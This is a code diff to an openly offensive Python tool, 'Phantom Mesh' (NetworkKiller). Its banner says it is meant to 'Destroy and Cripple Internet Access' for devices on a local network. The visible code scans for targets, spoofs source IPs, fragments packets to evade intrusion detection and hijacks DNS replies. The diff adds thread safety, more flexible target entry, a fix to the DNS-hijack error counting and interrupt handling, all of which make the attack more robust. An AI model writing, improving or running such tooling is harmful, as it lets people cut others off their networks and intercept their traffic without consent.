@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+# Author: mrch4n725
 import socket
 import threading
 import time
@@ -48,6 +49,7 @@ class NetworkKiller:
         self.fragment_packets = True  # Fragment packets to evade IDS
         self.random_source_ips = set()  # Store random IPs for spoofing
         self.print_lock = threading.Lock()  # Thread-safe printing
+        self.target_lock = threading.Lock()  # Protect target list during threaded scans
 
     def clear_screen(self):
         """Clear terminal screen."""
@@ -67,6 +69,7 @@ class NetworkKiller:
 ╔══════════════════════════════════════════════╗
 ║                                              ║
 ║            Phantom Mesh -v2.0-               ║
+║               by mrch4n725                   ║
 ║     Destroy and Cripple Internet Access      ║
 ║            (For real this time)              ║
 ╚══════════════════════════════════════════════╝
@@ -270,9 +273,10 @@ class NetworkKiller:
                     for send, receive in ans:
                         mac = receive.hwsrc
                     
-                    if not any(t["ip"] == ip for t in self.targets):
-                        self.targets.append({"ip": ip, "mac": mac})
-                        print(f"[+] Found: {ip} ({mac})")
+                    with self.target_lock:
+                        if not any(t["ip"] == ip for t in self.targets):
+                            self.targets.append({"ip": ip, "mac": mac})
+                            self.safe_print(f"[+] Found: {ip} ({mac})")
             except:
                 pass
         
@@ -308,25 +312,45 @@ class NetworkKiller:
     def manual_target_entry(self):
         """Allow manual entry of target IPs."""
         print("\n[*] Enter targets manually:")
-        print("    Format: IP,MAC or just IP (comma-separated)")
-        print("    Example: 192.168.1.5,00:11:22:33:44:55 or 192.168.1.5")
+        print("    Format: IP,MAC or just IP (semicolon-separated for multiple entries)")
+        print("    Example: 192.168.1.5,00:11:22:33:44:55; 192.168.1.10")
         
-        entry = input("[?] Enter target(s): ").strip()
+        try:
+            entry = input("[?] Enter target(s): ").strip()
+        except (KeyboardInterrupt, EOFError):
+            raise
         
         if not entry:
             return False
         
-        targets_list = entry.split(",")
-        for target in targets_list:
-            parts = target.strip().split()
-            if len(parts) >= 1:
+        for raw_target in re.split(r"[;\n]+", entry):
+            target = raw_target.strip()
+            if not target:
+                continue
+
+            ip = None
+            mac = "unknown"
+
+            if "," in target:
+                parts = [p.strip() for p in target.split(",", 1)]
                 ip = parts[0]
-                mac = parts[1] if len(parts) > 1 else "unknown"
-                
-                # Validate IP
-                if re.match(r"^(\d+\.){3}\d+$", ip):
-                    self.targets.append({"ip": ip, "mac": mac})
-                    print(f"[+] Added: {ip} ({mac})")
+                if len(parts) > 1 and parts[1]:
+                    mac = parts[1]
+            else:
+                parts = target.split()
+                if parts:
+                    ip = parts[0]
+                    if len(parts) > 1:
+                        mac = parts[1]
+
+            if not ip:
+                continue
+
+            if re.match(r"^(\d{1,3}\.){3}\d{1,3}$", ip):
+                self.targets.append({"ip": ip, "mac": mac})
+                print(f"[+] Added: {ip} ({mac})")
+            else:
+                print(f"[-] Skipping invalid entry: {target}")
         
         if self.targets:
             print(f"[+] Total targets: {len(self.targets)}")
@@ -423,7 +447,7 @@ class NetworkKiller:
         dns_detected = False
         
         def process_dns(pkt):
-            nonlocal request_count, dns_detected
+            nonlocal request_count, error_count, dns_detected
             if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                 dns_detected = True
                 try:
@@ -436,8 +460,7 @@ class NetworkKiller:
                     scapy.send(dns_qr, verbose=0, iface=scapy.conf.iface)
                     request_count += 1
                     self.safe_print(f"[DNS {target_ip}] Hijacked: {request_count}")
-                except Exception as e:
-                    nonlocal error_count
+                except Exception:
                     error_count += 1
         
         try:
@@ -840,34 +863,42 @@ class NetworkKiller:
     def run(self):
         """Main loop."""
         if os.geteuid() != 0:
-            print("[-] This requires root privileges! Run with: sudo python3 network_killa.py")
+            print("[-] This requires root privileges! Run with: sudo python3 phantom_menace.py")
             sys.exit(1)
         
         self.print_banner()
         
-        # Auto-detect network
-        if not self.auto_detect_network():
-            print("[-] Failed to detect network!")
-            sys.exit(1)
-        
-        # Get gateway MAC
-        if not self.get_gateway_mac():
-            print("[-] Failed to get gateway MAC!")
-            sys.exit(1)
-        
-        # Scan network
-        if not self.scan_network():
-            print("[-] Scan failed!")
-            sys.exit(1)
-        
-        # Select targets
-        if not self.select_targets():
-            print("[*] No targets selected. Exiting.")
+        try:
+            # Auto-detect network
+            if not self.auto_detect_network():
+                print("[-] Failed to detect network!")
+                sys.exit(1)
+            
+            # Get gateway MAC
+            if not self.get_gateway_mac():
+                print("[-] Failed to get gateway MAC!")
+                sys.exit(1)
+            
+            # Scan network
+            if not self.scan_network():
+                print("[-] Scan failed!")
+                sys.exit(1)
+            
+            # Select targets
+            if not self.select_targets():
+                print("[*] No targets selected. Exiting.")
+                sys.exit(0)
+        except (KeyboardInterrupt, EOFError):
+            print("\n[*] Operation aborted by user.")
             sys.exit(0)
         
         # Confirm attack
-        print("\n[!] WARNING: You are about to disable internet for selected devices!")
-        confirm = input("[?] Continue? (yes/no): ").strip().lower()
+        try:
+            print("\n[!] WARNING: You are about to disable internet for selected devices!")
+            confirm = input("[?] Continue? (yes/no): ").strip().lower()
+        except (KeyboardInterrupt, EOFError):
+            print("\n[*] Aborted by user.")
+            sys.exit(0)
         
         if confirm != "yes":
             print("[*] Aborted.")
